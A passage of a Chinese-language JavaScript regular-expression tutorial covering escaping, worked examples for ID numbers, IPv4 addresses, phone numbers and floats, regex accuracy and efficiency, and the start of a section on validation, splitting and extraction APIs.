punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "[abc]"</span>复制代码</code></pre><p>只需要在第一个方括号转义即可，因为后面的方括号构不成字符组，正则不会引发歧义，自然不需要转义。</p><p>同理，要匹配字符串”{3,5}”，只需要把正则写成<code>/\{3,5}/</code>即可。</p><p>另外，我们知道量词有简写形式<code>{m,}</code>，却没有<code>{,n}</code>的情况。虽然后者不构成量词的形式，但此时并不会报错。当然，匹配的字符串也是”{,n}”，测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"{,3}"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/{,3}/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "{,3}"</span>复制代码</code></pre><p><strong>2.3.3 其余情况</strong></p><p>比如<code>=</code> <code>!</code> <code>:</code> <code>-</code> <code>,</code>等符号，只要不在特殊结构中，也不需要转义。</p><p>但是，括号需要前后都转义的，如<code>/\(123\)/</code>。</p><p>至于剩下的<code>^</code> <code>$</code> <code>.</code> <code>*</code> <code>+</code> <code>?</code> <code>|</code> <code>\</code> <code>/</code>等字符，只要不在字符组内，都需要转义的。</p><h3 id="3-案例分析"><a href="#3-案例分析" class="headerlink" title="3. 案例分析"></a>3. 案例分析</h3><p>接下来分析两个例子，一个简单的，一个复杂的。</p><p><strong>3.1 身份证</strong></p><p>正则表达式是：</p><p><code>/^(\d{15}|\d{17}[\dxX])$/</code></p><p>因为竖杠“|”,的优先级最低，所以正则分成了两部分<code>\d{15}</code>和<code>\d{17}[\dxX]</code>。</p><ul><li><code>\d{15}</code>表示15位连续数字。</li><li><code>\d{17}[\dxX]</code>表示17位连续数字，最后一位可以是数字可以大小写字母”x”。</li></ul><p>可视化如下：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/e47d20e904f9b5665942a01fc9d6111d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><strong>3.2 IPV4地址</strong></p><p>正则表达式是：</p><p><code>/^((0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])\.){3}(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])$/</code></p><p>这个正则，看起来非常吓人。但是熟悉优先级后，会立马得出如下的结构：</p><p><code>((...)\.){3}(...)</code></p><p>上面的两个<code>(...)</code>是一样的结构。表示匹配的是3位数字。因此整个结构是</p><blockquote><p>3位数.3位数.3位数.3位数</p></blockquote><p>然后再来分析<code>(...)</code>：</p><p><code>(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])</code></p><p>它是一个多选结构，分成5个部分：</p><ul><li><code>0{0,2}\d</code>，匹配一位数，包括0补齐的。比如，9、09、009；</li><li><code>0?\d{2}</code>，匹配两位数，包括0补齐的，也包括一位数；</li><li><code>1\d{2}</code>，匹配100到199;</li><li><code>2[0-4]\d</code>，匹配200-249；</li><li><code>25[0-5]</code>，匹配250-255。</li></ul><p>最后来看一下其可视化形式：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/c0a482018c3bfa876b0b5a45ddd67c80?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="第五章小结"><a href="#第五章小结" class="headerlink" title="第五章小结"></a>第五章小结</h3><p>掌握正则表达式中的优先级后，再看任何正则应该都有信心分析下去了。</p><p>至于例子，不一而足，没有写太多。</p><p>这里稍微总结一下，竖杠的优先级最低，即最后运算。</p><p>只要知道这一点，就能读懂大部分正则。</p><p>另外关于元字符转义问题，当自己不确定与否时，尽管去转义，总之是不会错的。</p><h2 id="第6章-正则表达式的构建"><a href="#第6章-正则表达式的构建" class="headerlink" title="第6章 正则表达式的构建"></a>第6章 正则表达式的构建</h2><p>对于一门语言的掌握程度怎么样，可以有两个角度来衡量：读和写。</p><p>不仅要看懂别人的解决方案，也要能独立地解决问题。代码是这样，正则表达式也是这样。</p><p>与“读”相比，“写”往往更为重要，这个道理是不言而喻的。</p><p>对正则的运用，首重就是：如何针对问题，构建一个合适的正则表达式？</p><p>本章就解决该问题，内容包括：</p><ol><li>平衡法则</li><li>构建正则前提</li><li>准确性</li><li>效率</li></ol><h3 id="1-平衡法则"><a href="#1-平衡法则" class="headerlink" title="1. 平衡法则"></a>1. 平衡法则</h3><p>构建正则有一点非常重要，需要做到下面几点的平衡：</p><ol><li>匹配预期的字符串</li><li>不匹配非预期的字符串</li><li>可读性和可维护性</li><li>效率</li></ol><h3 id="2-构建正则前提"><a href="#2-构建正则前提" class="headerlink" title="2. 构建正则前提"></a>2. 构建正则前提</h3><p><strong>2.1 是否能使用正则</strong></p><p>正则太强大了，以至于我们随便遇到一个操作字符串问题时，都会下意识地去想，用正则该怎么做。但我们始终要提醒自己，正则虽然强大，但不是万能的，很多看似很简单的事情，还是做不到的。</p><p>比如匹配这样的字符串：1010010001….</p><p>虽然很有规律，但是只靠正则就是无能为力。</p><p><strong>2.2 是否有必要使用正则</strong></p><p>要认识到正则的局限，不要去研究根本无法完成的任务。同时，也不能走入另一个极端：无所不用正则。能用字符串API解决的简单问题，就不该正则出马。</p><ul><li>比如，从日期中提取出年月日，虽然可以使用正则：</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-07-01"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017-07-01", "2017", "07", "01", index: 0, input: "2017-07-01"]</span>复制代码</code></pre><p>其实，可以使用字符串的<code>split</code>方法来做，即可：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-07-01"</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> result <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017", "07", "01"]</span>复制代码</code></pre><ul><li>比如，判断是否有问号，虽然可以使用：</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"?id=xx&amp;act=search"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex">/\?/</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => 0</span>复制代码</code></pre><p>其实，可以使用字符串的<code>indexOf</code>方法：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"?id=xx&amp;act=search"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => 0</span>复制代码</code></pre><ul><li>比如获取子串，虽然可以使用正则：</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"JavaScript"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/.{4}(.+)/</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => Script</span>复制代码</code></pre><p>其实，可以直接使用字符串的<code>substring</code>或<code>substr</code>方法来做：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"JavaScript"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => Script</span>复制代码</code></pre><p><strong>2.3 是否有必要构建一个复杂的正则</strong></p><p>比如密码匹配问题，要求密码长度6-12位，由数字、小写字符和大写字母组成，但必须至少包括2种字符。</p><p>在第2章里，我们写出了正则是：</p><p><code>/(?!^[0-9]{6,12}$)(?!^[a-z]{6,12}$)(?!^[A-Z]{6,12}$)^[0-9A-Za-z]{6,12}$/</code></p><p>其实可以使用多个小正则来做：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex1 <span class="token operator">=</span> <span class="token regex">/^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex2 <span class="token operator">=</span> <span class="token regex">/^[0-9]{6,12}$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex3 <span class="token operator">=</span> <span class="token regex">/^[A-Z]{6,12}$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex4 <span class="token operator">=</span> <span class="token regex">/^[a-z]{6,12}$/</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">checkPassword</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>regex1<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>regex2<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>regex3<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>regex4<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span>复制代码</code></pre><h3 id="3-准确性"><a href="#3-准确性" class="headerlink" title="3. 准确性"></a>3. 准确性</h3><p>所谓准确性，就是能匹配预期的目标，并且不匹配非预期的目标。</p><p>这里提到了“预期”二字，那么我们就需要知道目标的组成规则。</p><p>不然没法界定什么样的目标字符串是符合预期的，什么样的又不是符合预期的。</p><p>下面将举例说明，当目标字符串构成比较复杂时，该如何构建正则，并考虑到哪些平衡。</p><p><strong>3.1 匹配固定电话</strong></p><p>比如要匹配如下格式的固定电话号码：</p><blockquote><p>055188888888</p><p>0551-88888888</p><p>(0551)88888888</p></blockquote><p>第一步，了解各部分的模式规则。</p><p>上面的电话，总体上分为区号和号码两部分（不考虑分机号和+86的情形）。</p><p>区号是0开头的3到4位数字，对应的正则是：<code>0\d{2,3}</code></p><p>号码是非0开头的7到8位数字，对应的正则是：<code>[1-9]\d{6,7}</code></p><p>因此，匹配055188888888的正则是：<code>/^0\d{2,3}[1-9]\d{6,7}$/</code></p><p>匹配0551-88888888的正则是：<code>/^0\d{2,3}-[1-9]\d{6,7}$/</code></p><p>匹配(0551)88888888的正则是：<code>/^\(0\d{2,3}\)[1-9]\d{6,7}$/</code></p><p>第二步，明确形式关系。</p><p>这三者情形是或的关系，可以构建分支：</p><p><code>/^0\d{2,3}[1-9]\d{6,7}$|^0\d{2,3}-[1-9]\d{6,7}$|^\(0\d{2,3}\)[1-9]\d{6,7}$/</code></p><p>提取公共部分：</p><p><code>/^(0\d{2,3}|0\d{2,3}-|\(0\d{2,3}\))[1-9]\d{6,7}$/</code></p><p>进一步简写：</p><p><code>/^(0\d{2,3}-?|\(0\d{2,3}\))[1-9]\d{6,7}$/</code></p><p>其可视化形式：</p><p><img src="data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg" alt="img"></p><p>上面的正则构建过程略显罗嗦，但是这样做，能保证正则是准确的。</p><p>上述三种情形是或的关系，这一点很重要，不然很容易按字符是否出现的情形把正则写成：</p><p><code>/^\(?0\d{2,3}\)?-?[1-9]\d{6,7}$/</code></p><p>虽然也能匹配上述目标字符串，但也会匹配(0551-88888888这样的字符串。当然，这不是我们想要的。</p><p>其实这个正则也不是完美的，因为现实中，并不是每个3位数和4位数都是一个真实的区号。</p><p>这就是一个平衡取舍问题，一般够用就行。</p><p><strong>3.2 匹配浮点数</strong></p><p>要求匹配如下的格式：</p><blockquote><p>1.23、+1.23、-1.23</p><p>10、+10、-10</p><p>.2、+.2、-.2</p></blockquote><p>可以看出正则分为三部分。</p><p>符号部分：<code>[+-]</code></p><p>整数部分：<code>\d+</code></p><p>小数部分：<code>\.\d+</code></p><p>上述三个部分，并不是全部都出现。如果此时很容易写出如下的正则：</p><p><code>/^[+-]?(\d+)?(\.\d+)?$/</code></p><p>此正则看似没问题，但这个正则也会匹配空字符””。</p><p>因为目标字符串的形式关系不是要求每部分都是可选的。</p><p>要匹配1.23、+1.23、-1.23，可以用<code>/^[+-]?\d+\.\d+$/</code></p><p>要匹配10、+10、-10，可以用<code>/^[+-]?\d+$/</code></p><p>要匹配.2、+.2、-.2，可以用<code>/^[+-]?\.\d+$/</code></p><p>因此整个正则是这三者的或的关系，提取公众部分后是：</p><p><code>/^[+-]?(\d+\.\d+|\d+|\.\d+)$/</code></p><p>其可视化形式是：</p><p><img src="data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg" alt="img"></p><p>如果要求不匹配+.2和-.2，此时正则变成：</p><p><img src="data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg" alt="img"></p><p>当然，<code>/^[+-]?(\d+\.\d+|\d+|\.\d+)$/</code>也不是完美的，我们也是做了些取舍，比如：</p><ul><li>它也会匹配012这样以0开头的整数。如果要求不匹配的话，需要修改整数部分的正则。</li><li>一般进行验证操作之前，都要经过trim和判空。那样的话，也许那个错误正则也就够用了。</li><li>也可以进一步改写成：<code>/^[+-]?(\d+)?(\.)?\d+$/</code>，这样我们就需要考虑可读性和可维护性了。</li></ul><h3 id="4-效率"><a href="#4-效率" class="headerlink" title="4. 效率"></a>4. 效率</h3><p>保证了准确性后，才需要是否要考虑要优化。大多数情形是不需要优化的，除非运行的非常慢。什么情形正则表达式运行才慢呢？我们需要考察正则表达式的运行过程（原理）。</p><p>正则表达式的运行分为如下的阶段：</p><ol><li>编译</li><li>设定起始位置</li><li>尝试匹配</li><li>匹配失败的话，从下一位开始继续第3步</li><li>最终结果：匹配成功或失败</li></ol><p>下面以代码为例，来看看这几个阶段都做了什么：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d+/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>lastIndex<span class="token punctuation">,</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"123abc34def"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>lastIndex<span class="token punctuation">,</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"123abc34def"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>lastIndex<span class="token punctuation">,</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"123abc34def"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span>lastIndex<span class="token punctuation">,</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"123abc34def"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => 0 ["123", index: 0, input: "123abc34def"]</span><span class="token comment" spellcheck="true">// => 3 ["34", index: 6, input: "123abc34def"]</span><span class="token comment" spellcheck="true">// => 8 null</span><span class="token comment" spellcheck="true">// => 0 ["123", index: 0, input: "123abc34def"]</span>复制代码</code></pre><p>具体分析如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d+/g</span><span class="token punctuation">;</span>复制代码</code></pre><p>当生成一个正则时，引擎会对其进行编译。报错与否出现这这个阶段。</p><pre class=" language-js"><code class="language-js">regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"123abc34def"</span><span class="token punctuation">)</span>复制代码</code></pre><p>当尝试匹配时，需要确定从哪一位置开始匹配。一般情形都是字符串的开头，即第0位。</p><p>但当使用<code>test</code>和<code>exec</code>方法，且正则有<code>g</code>时，起始位置是从正则对象的<code>lastIndex</code>属性开始。</p><p>因此第一次<code>exec</code>是从第0位开始，而第二次是从3开始的。</p><p>设定好起始位置后，就开始尝试匹配了。</p><p>比如第一次<code>exec</code>，从0开始，去尝试匹配，并且成功地匹配到3个数字。此时结束时的下标是2，因此下一次的起始位置是3。</p><p>而第二次，起始下标是3，但第3个字符是“a”，并不是数字。但此时并不会直接报匹配失败，而是移动到下一位置，即从第4位开始继续尝试匹配，但该字符是b，也不是数字。再移动到下一位，是c仍不行，再移动一位是数字3，此时匹配到了两位数字34。此时，下一次匹配的位置是d的位置，即第8位。</p><p>第三次，是从第8位开始匹配，直到试到最后一位，也没发现匹配的，因此匹配失败，返回<code>null</code>。同时设置<code>lastIndex</code>为0，即，如要再尝试匹配的话，需从头开始。</p><p>从上面可以看出，匹配会出现效率问题，主要出现在上面的第3阶段和第4阶段。</p><p>因此，主要优化手法也是针对这两阶段的。</p><p><strong>4.1 使用具体型字符组来代替通配符，来消除回溯</strong></p><p>而在第三阶段，最大的问题就是回溯。</p><p>例如，匹配双引用号之间的字符。如，匹配字符串123”abc”456中的”abc”。</p><p>如果正则用的是：<code>/&quot;.*&quot;/</code>，，会在第3阶段产生4次回溯（粉色表示<code>.*</code>匹配的内容）：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/5b677f04f2b8d5d776060cea3b045863?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>如果正则用的是：<code>/&quot;.*?&quot;/</code>，会产生2次回溯（粉色表示<code>.*?</code>匹配的内容）：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a064ff019c3c6cdde6005b6c83b60e7b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>因为回溯的存在，需要引擎保存多种可能中未尝试过的状态，以便后续回溯时使用。注定要占用一定的内存。</p><p>此时要使用具体化的字符组，来代替通配符<code>.</code>，以便消除不必要的字符，此时使用正则<code>/&quot;[^&quot;]*&quot;/</code>，即可。</p><p><strong>4.2 使用非捕获型分组</strong></p><p>因为括号的作用之一是，可以捕获分组和分支里的数据。那么就需要内存来保存它们。</p><p>当我们不需要使用分组引用和反向引用时，此时可以使用非捕获分组。例如：</p><p><code>/^[+-]?(\d+\.\d+|\d+|\.\d+)$/</code></p><p>可以修改成：</p><p><code>/^[+-]?(?:\d+\.\d+|\d+|\.\d+)$/</code></p><p><strong>4.3 独立出确定字符</strong></p><p>例如<code>/a+/</code>，可以修改成<code>/aa*/</code>。</p><p>因为后者能比前者多确定了字符a。这样会在第四步中，加快判断是否匹配失败，进而加快移位的速度。</p><p><strong>4.4 提取分支公共部分</strong></p><p>比如/<code>^abc|^def/</code>，修改成<code>/^(?:abc|def)/</code>。</p><p>又比如<code>/this|that/</code>，修改成<code>/th(?:is|at)/</code>。</p><p>这样做，可以减少匹配过程中可消除的重复。</p><p><strong>4.5 减少分支的数量，缩小它们的范围</strong></p><p><code>/red|read/</code>，可以修改成<code>/rea?d/</code>。此时分支和量词产生的回溯的成本是不一样的。但这样优化后，可读性会降低的。</p><h3 id="第六章小结"><a href="#第六章小结" class="headerlink" title="第六章小结"></a>第六章小结</h3><p>本章涉及的内容并不多。</p><p>一般情况下，针对某问题能写出一个满足需求的正则，基本上就可以了。</p><p>至于准确性和效率方面的追求，纯属看个人要求了。我觉得够用就行了。</p><p>关于准确性，本章关心的是最常用的解决思路：</p><p>针对每种情形，分别写出正则，然用分支把他们合并在一起，再提取分支公共部分，就能得到准确的正则。</p><p>至于优化，本章没有为了凑数，去写一大堆。了解了匹配原理，常见的优化手法也就这么几种。</p><h2 id="第七章-正则表达式编程"><a href="#第七章-正则表达式编程" class="headerlink" title="第七章 正则表达式编程"></a>第七章 正则表达式编程</h2><p>什么叫知识，能指导我们实践的东西才叫知识。</p><p>学习一样东西，如果不能使用，最多只能算作纸上谈兵。正则表达式的学习，也不例外。</p><p>掌握了正则表达式的语法后，下一步，也是关键的一步，就是在真实世界中使用它。</p><p>那么如何使用正则表达式呢？有哪些关键的点呢？本章就解决这个问题。</p><p>内容包括：</p><ol><li>正则表达式的四种操作</li><li>相关API注意要点</li><li>真实案例</li></ol><h3 id="1-正则表达式的四种操作"><a href="#1-正则表达式的四种操作" class="headerlink" title="1. 正则表达式的四种操作"></a>1. 正则表达式的四种操作</h3><p>正则表达式是匹配模式，不管如何使用正则表达式，万变不离其宗，都需要先“匹配”。</p><p>有了匹配这一基本操作后，才有其他的操作：验证、切分、提取、替换。</p><p>进行任何相关操作，也需要宿主引擎相关API的配合使用。当然，在JS中，相关API也不多。</p><p><strong>1.1 验证</strong></p><p>验证是正则表达式最直接的应用，比如表单验证。</p><p>在说验证之前，先要说清楚匹配是什么概念。</p><p>所谓匹配，就是看目标字符串里是否有满足匹配的子串。因此，“匹配”的本质就是“查找”。</p><p>有没有匹配，是不是匹配上，判断是否的操作，即称为“验证”。</p><p>这里举一个例子，来看看如何使用相关API进行验证操作的。</p><p>比如，判断一个字符串中是否有数字。</p><ul><li>使用<code>search</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"abc123"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">~</span>string<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><ul><li>使用<code>test</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"abc123"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><ul><li>使用<code>match</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"abc123"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">!</span>string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><ul><li>使用<code>exec</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"abc123"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">!</span>regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p>其中，最常用的是<code>test</code>。</p><p><strong>1.2 切分</strong></p><p>匹配上了，我们就可以进行一些操作，比如切分。</p><p>所谓“切分”，就是把目标字符串，切成一段一段的。在JS中使用的是<code>split</code>。</p><p>比如，目标字符串是”html,css,javascript”，按逗号来切分：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/,/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"html,css,javascript"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["html", "css", "javascript"]</span>复制代码</code></pre><p>又比如，如下的日期格式：</p><blockquote><p>2017/06/26</p><p>2017.06.26</p><p>2017-06-26</p></blockquote><p>可以使用<code>split</code>“切出”年月日：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\D/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">"2017/06/26"</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">"2017.06.26"</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["2017", "06", "26"]</span><span class="token comment" spellcheck="true">// => ["2017", "06", "26"]</span><span class="token comment" spellcheck="true">// => ["2017", "06", "26"]</span>复制代码</code></pre><p><strong>1.3 提取</strong></p><p>虽然整体匹配上了，但有时需要提取部分匹配的数据。</p><p>此时正则通常要使用分组引用（分组捕获）功能，还需要配合使用相关API。</p><p>这里，还是以日期为例，提取出年月日。注意下面正则中的括号：</p><ul><li><code>match</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(\d{4})\D(\d{2})\D(\d{2})$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-26"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// =>["2017-06-26", 